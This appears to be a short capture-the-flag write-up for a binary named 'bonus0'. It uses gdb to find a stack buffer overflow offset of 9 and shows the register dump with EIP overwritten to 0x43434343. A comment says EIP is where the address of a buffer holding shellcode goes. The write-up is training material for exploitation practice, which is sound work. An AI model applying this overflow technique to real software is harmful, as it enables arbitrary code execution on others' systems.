## bonus0
In `bonus0` we will find three functions`p() pp() main()`






-------------------------------------------------------------
After some tests we find our *offset* as a value of `9`
```
-
AAAAAAAAAAAAAAAAAAAA
-
BBBBBBBBBBCCCCCCCCCC
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBCCCCCCCCCC�� BBBBBBBBBBCCCCCCCCCC��  <-- here with 10 B we still have one 42 at the address
0x43434342 in ?? () <-- the last 42 it's the 10th B

-
AAAAAAAAAAAAAAAAAAAA
-
BBBBBBBBBCCCCCCCCCCC
AAAAAAAAAAAAAAAAAAAABBBBBBBBBCCCCCCCCCCC�� BBBBBBBBBCCCCCCCCCCC�� <-- here with 9 B the address of the $eip is set to 0x43434343 that is the C
0x43434343 in ?? () <-- offset equal 9

(gdb) i r
eax            0x0	0
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff700	0xbffff700
ebp            0x42424242	0x42424242
esi            0x0	0
edi            0x0	0
eip            0x43434343	0x43434343    <--- the eip is overwrote, here we need to put the address of the buffer[0x100] with our shellcode
eflags         0x200286	[ PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
